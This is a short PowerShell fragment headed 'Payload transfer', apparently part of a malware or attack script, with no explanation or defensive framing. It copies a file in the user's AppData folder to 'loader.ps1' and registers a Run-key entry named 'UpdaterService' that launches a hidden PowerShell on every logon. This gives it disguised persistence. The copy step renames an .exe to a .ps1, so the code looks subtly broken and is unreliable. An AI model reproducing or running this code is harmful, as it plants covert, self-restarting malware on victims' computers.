# Payload transfer
Copy-Item -Path "$env:APPDATA\svcupdate.exe" -Destination "$env:APPDATA\loader.ps1" -Force
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'UpdaterService' -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + "$env:APPDATA\loader.ps1" + '"') -PropertyType String -Force
Start-Sleep -Seconds 6
